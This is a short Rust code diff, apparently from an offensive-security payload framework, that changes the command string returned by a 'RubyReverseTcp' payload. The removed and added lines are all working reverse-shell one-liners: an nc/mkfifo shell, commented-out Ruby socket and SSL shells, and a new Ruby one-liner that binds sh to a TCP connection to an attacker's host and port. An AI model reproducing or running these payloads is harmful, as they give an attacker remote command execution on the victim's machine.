@@ -25,18 +25,8 @@ impl Payload for RubyReverseTcp {
     }
 
     fn blob(&self) -> Vec<u8> {
-        // let blob = format!("ruby -e \"require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{}\",\"{}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){{|io|c.print io.read}}end\"", self.reverse.lhost, self.reverse.lport);
-        /*
-            let blob = format!(
-                r#"ruby -e 'require "socket";c=TCPSocket.new("{}", {});
-        $stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{{|l|l=l.strip;next if l.length==0;
-        (IO.popen(l,"rb"){{|fd| fd.each_line {{|o| c.puts(o.strip) }}}}) rescue nil }}'"#,
-                self.reverse.lhost, self.reverse.lport
-            );
-        */
-        // TODO: for now just setting blob as nc mkfifo for testing
         let blob = format!(
-            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f",
+            r#"ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{}",{}))'"#,
             self.reverse.lhost, self.reverse.lport
         );
         blob.into_bytes()
